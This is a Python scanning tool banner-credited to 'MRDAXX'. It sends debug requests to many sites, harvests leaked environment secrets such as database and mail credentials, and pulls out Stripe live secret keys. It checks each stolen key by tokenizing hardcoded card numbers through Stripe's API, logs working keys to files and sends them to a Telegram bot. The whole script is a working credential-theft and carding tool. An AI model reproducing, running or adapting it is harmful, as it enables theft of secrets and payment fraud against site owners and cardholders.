import re
import sys
import os
import time
import urllib3
import os.path
import requests
import random
from colorama import Fore, Back, Style, init 
from os import path
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

debug = 0
sk = 0
checked = 0
live = 0
dead = 0
custom=0
numbers = [
    "4023470607106283",
    "4355460262657363",
    "4023470602125650",
    "5111010022465466",
    "4095950011560764"
]
cc = random.choice(numbers)
class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LXC = '\033[38;2;255;152;0m'
    GREY = '\033[38;2;158;158;158m'

class ENV:
    def scan(self, url):
        global debug
        global sk
        global live
        global dead
        global custom
        global checked
        rr = ''
        mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live', 'APP_DEBUG']

        try:
            data = {'debug': 'true'}
            r = requests.post(f'https://{url}', data=data, allow_redirects=False, verify=False, timeout=10)
            resp = r.text
            checked += 1
            if any(key in resp for key in mch):
                rr = f'{xcol.LGREEN}[+]{xcol.RESET} : https://{url}'
                with open(os.path.join('DEBUG', f'{url}.txt'), 'w', encoding='utf-8') as output:
                    output.write(f'{resp}\n')
                debug += 1
                with open(os.path.join('DEBUG', 'debug.txt'), 'a', encoding='utf-8') as output:
                    output.write(f'{url}\n')
                lin = resp.splitlines()
                for x in lin:
                    if "sk_live" in x:
                        pattern = r'sk_live_[a-zA-Z0-9]+'
                        matches = re.findall(pattern, x)  # Use x instead of resp.text
                        pattern1 = r'pk_live_[a-zA-Z0-9]+'
                        matches1 = re.findall(pattern1, resp)
                        
                        for match in matches:  # Iterate over the matches
                            stripe_key = match
                            sk += 1
                            url = 'https://api.stripe.com/v1/account'
                            username = stripe_key  # Use the extracted stripe_key as the username
                            password = ''
                            session = requests.Session()
                            session.auth = (username, password)
                            session.verify = False
                            response = session.get(url, data=data)
                            if '"charges_enabled": true,' in response.text:                                        
                                    url = 'https://api.stripe.com/v1/tokens'
                                    username = stripe_key  # Use the extracted stripe_key as the username
                                    password = ''
                                    data = {
                                        'card[number]': cc,
                                        'card[exp_month]': '04',
                                        'card[exp_year]': '2030',
                                        'card[cvc]': '011'
                                    }
                                    session = requests.Session()
                                    session.auth = (username, password)
                                    session.verify = False
                                    response = session.post(url, data=data)
                                    if 'pm_' in response.text:
                                        live += 1
                                        file_object = open('SK_LIVE.TXT', 'a')
                                        file_object.write(f'{stripe_key}\n')
                                        file_object.close
                                    if 'Sending credit' in response.text:
                                            file_object = open('SK_LIVE.TXT', 'a')
                                            file_object.write(f'{stripe_key}\n')
                                            file_object.close
                                            req= requests.get(f'https://api.telegram.org/bot<bottoken>/sendMessage?chat_id=<chatid>&text=LIVE SK {stripe_key}')
                                            C1 += 1
                            else:
                                file_object = open('SK_DEAD.TXT', 'a')
                                file_object.write(f'{stripe_key}\n')
                                file_object.close
                                dead += 1
                                                        
                            
                    
            else:
                rr = f'{xcol.LXC}[-] :{xcol.RESET} https://{url}'
        except:
            rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'

        # Print a progress bar-like output
        sys.stdout.write(f'\r{Fore.YELLOW}Total Checked= {checked}/{len(argFile)},{Fore.GREEN} Total debug: {debug}, {Fore.BLUE}Total sk: {sk},{Fore.GREEN} live sk: {live},{Fore.YELLOW}Custom sk: {custom}, {Fore.RED}Dead sk: {dead}')
        sys.stdout.flush()

if __name__ == '__main__':
    os.system('clear')
    print(Fore.MAGENTA + '''
    
██████╗░███████╗██████╗░██╗░░░██╗░██████╗░
██╔══██╗██╔════╝██╔══██╗██║░░░██║██╔════╝░
██║░░██║█████╗░░██████╦╝██║░░░██║██║░░██╗░
██║░░██║██╔══╝░░██╔══██╗██║░░░██║██║░░╚██╗
██████╔╝███████╗██████╦╝╚██████╔╝╚██████╔╝
╚═════╝░╚══════╝╚═════╝░░╚═════╝░░╚═════╝░

: Coded by MRDAXX''')
if not os.path.isdir("DEBUG"):
    os.makedirs("DEBUG")

threads = []
while True:
    try:
        thrd = int(input(Fore.CYAN + "[THREAD] : " + Fore.RESET))
        break
    except:
        pass

while True:
    try:
        inpFile = input(Fore.CYAN + "[URLS PATH] : " + Fore.RESET)
        with open(inpFile) as urlList:
            argFile = urlList.read().splitlines()
            total_url = len(argFile)
        break
    except:
        pass

with ThreadPoolExecutor(max_workers=thrd) as executor:
    for data in argFile:
        threads.append(executor.submit(ENV().scan, data))
                              
